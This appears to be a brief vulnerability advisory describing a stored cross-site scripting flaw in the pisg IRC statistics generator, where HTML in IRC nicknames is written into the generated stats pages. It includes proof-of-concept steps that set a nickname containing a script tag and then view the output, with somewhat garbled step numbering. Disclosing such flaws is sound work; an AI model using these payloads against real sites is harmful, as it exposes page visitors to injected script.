pisg has been reported prone to an input validation vulnerability. The issue will only present itself when pisg is used to monitor an IRC server that does not place limitations on IRC Nick values that can be used.

If an attacker specifies HTML code as a value for the IRC Nickname, this value may be incorporated into the HTML pages that are generated by pisg.

PROOF:
1. silc
2. /connect %Suitable IRC server%
3. /nick <script>alert(document.domain);</script>
4. /log ...
5. /me a couple of times on a channel
6. /quit
3. then generate stats ./pisg
4. surf the index.html
